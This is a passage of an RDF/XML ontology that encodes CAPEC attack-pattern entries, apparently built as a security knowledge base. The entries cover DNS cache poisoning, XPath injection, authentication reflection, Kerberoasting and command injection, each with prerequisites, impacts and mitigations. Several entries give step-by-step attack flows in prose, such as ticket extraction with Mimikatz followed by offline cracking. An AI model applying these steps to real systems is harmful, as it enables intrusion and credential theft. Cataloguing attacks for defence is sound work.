          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:89::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#DNS Cache Poisoning"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack1">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#142"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::348::345::349::346::441::350::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Explore resolver caches) Check DNS caches on local DNS server and client&apos;s browser with DNS cache enabled.TECHNIQUE:Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.:TECHNIQUE:Figure out if the client&apos;s browser has DNS cache enabled.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt sending crafted records to DNS cache) A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server  and then floods responses that trick a DNS cache to remember malicious responses  which are wrong answers of DNS query.TECHNIQUE:Adversary must know the transaction ID by intercepting a DNS query  or sending a bogus query with known transaction ID.:TECHNIQUE:If the transaction ID used to identify each query instance is randomized in some new DNS software  the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction:TECHNIQUE:Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website&apos;s IP address.::STEP:3:PHASE:Exploit:DESCRIPTION:(Redirect users to malicious website) As the adversary succeeds in exploiting the vulnerability  the victim connects to a malicious site using a good web site&apos;s domain name.TECHNIQUE:Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.:TECHNIQUE:Man-in-the-Middle intercepts secure communication between two parties.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::348::345::349::346::441::350::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To overwrite/modify targeted DNS cache:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have the resources to modify the targeted cache. In addition  in most cases the adversary will wish to host the sites to which users will be redirected  although in some cases redirecting to a third party site will accomplish the adversary&apos;s goals.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker356">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#536">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:176::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Data Injected During Configuration"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack356">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#536"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have previously compromised the victim&apos;s systems or have physical access to the victim&apos;s systems.::Advanced knowledge of software and hardware capabilities of a manufacturer&apos;s product.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to generate and inject false data into operational data into a system with the intent of causing the victim to alter the configuration of the system.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker489">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#321"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack489"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker223">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#524"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack223"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Physical access to an integration facility that prepares the system before it is deployed at the victim location.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Advanced knowledge of the design of the system.:LEVEL:High::SKILL:Hardware creation and manufacture of replacement components.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker400">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#617">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:616::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cellular Rogue Base Station"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack400">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#617"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Intercept and control cellular data communications to/from mobile device.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This technique has been demonstrated by amateur hackers and commercial tools and open source projects are available to automate the attack.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Keep patches up to date by installing weekly or daily if possible.::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack57">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#580">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Application Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack13">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#529">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Malware-Directed Internal Reconnaissance"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker229">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#83">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:250::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XPath Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack229">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#83"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::91::74::20::713::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instances of user-controllable input used to contruct XPath queries.TECHNIQUE:Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes inputs.::STEP:2:PHASE:Explore:DESCRIPTION:(Determines the structure of queries) Using manual or automated means  query inputs found for XPath weaknesses.TECHNIQUE:Use an automated tool automatically probe the inputs for XPath weaknesses.:TECHNIQUE:Manually probe the inputs using characters such as single quote (&apos;) that can cause XPath-releated errors  thus indicating an XPath weakness.::STEP:3:PHASE:Exploit:DESCRIPTION:(Exploit the target) Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.TECHNIQUE:Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::91::74::20::713::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::XPath queries used to retrieve information stored in XML documents::User-controllable input not properly sanitized before being used as part of XPath queries::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker228">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#90">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::NATURE:ChildOf:CAPEC ID:114::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Reflection Attack in Authentication Protocol"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack228">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#90"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::301::303::718::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:The attacker opens a connection to the target server and sends it a challenge::STEP:2:PHASE:Experiment:DESCRIPTION:The server responds by returning the challenge encrypted with a shared secret as well as its own challenge to the attacker::STEP:3:PHASE:Experiment:DESCRIPTION:Since the attacker does not possess the shared secret  he initiates a second connection to the server and sends it  as challenge  the challenge received from the server on the first connection::STEP:4:PHASE:Experiment:DESCRIPTION:The server treats this as just another handshake and responds by encrypting the challenge and issuing its own to the attacker::STEP:5:PHASE:Experiment:DESCRIPTION:The attacker now receives the encrypted challenge on the second connection and sends it as response to the server on the first connection  thereby successfully completing the handshake and authenticating to the server.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::301::303::718::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity  such as a router or proxy  that handles these exchanges on behalf of the attacker inhibits the attackers&apos; ability to attack the authentication protocol.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to have knowledge of observing the protocol exchange and managing the required connections in order to issue and respond to challenges:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker227">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#133">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:113::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Try All Common Switches"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack227">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#133"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::912::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::912::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to control the options or switches sent to the target.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to send requests to the target.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired  but if a blacklisting approach is necessary  then focusing on command related terms and delimiters is necessary.::Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example  quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.::Input should be parameterized  or restricted to data sections of a command  thus removing the chance that the input will be treated as part of the command itself.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack128">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#248">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Command Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::77::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful command injection attack enables an adversary to alter the command being executed and achieve a variety of negative consequences depending on the makeup of the new command. This includes potential information disclosure or the corruption of application data.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker484">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#326"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack484"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker351">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#517"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack351"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge of internal software and hardware components within manufacturer&apos;s development environment.::Access to the manufacturer&apos;s documentation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to read  interpret  and subsequently alter manufacturer&apos;s documentation to prevent dial-down capabilities.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer&apos;s documentation.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker350">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#261"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack350"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries  so the attacker must either have a modified client or their own application which allows them to modify the expected queries.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker483">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#327"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack483"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Monitor system and domain logs for abnormal access.::Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity  and they should expire after a period of time.::Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.::Enable AES Kerberos encryption (or another stronger encryption algorithm)  rather than RC4  where possible.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack507">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#509">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:560::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Kerberoasting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::552::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Scan for user accounts with set SPN valuesTECHNIQUE:These can be found via Powershell or LDAP queries  as well as enumerating startup name accounts and other means.::STEP:2:PHASE:Explore:DESCRIPTION:Request service ticketsTECHNIQUE:Using user account&apos;s SPN value  request other service tickets from Active Directory::STEP:3:PHASE:Experiment:DESCRIPTION:Extract ticket and save to diskTECHNIQUE:Certain tools like Mimikatz can extract local tickets and save them to memory/disk.:TECHNIQUE::TECHNIQUE:::STEP:4:PHASE:Exploit:DESCRIPTION:Crack the encrypted ticket to harvest plain text credentialsTECHNIQUE:Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password  the easier it is to crack.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker481">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#323"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack481"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Any type of active probing that involves non-standard packet headers requires the use of raw sockets  which is not available on particular operating systems (Microsoft Windows XP SP 2  for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker482">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#317"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack482"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack204">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#443">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Logic Inserted Into Product Software by Authorized Developer"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack38">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#446">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Logic Insertion into Product Software via Inclusion of 3rd Party Component Dependency"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker179">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#220"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack179"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::757::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.::"/>
    </j.0:uses>
  </j.0:Attacker>
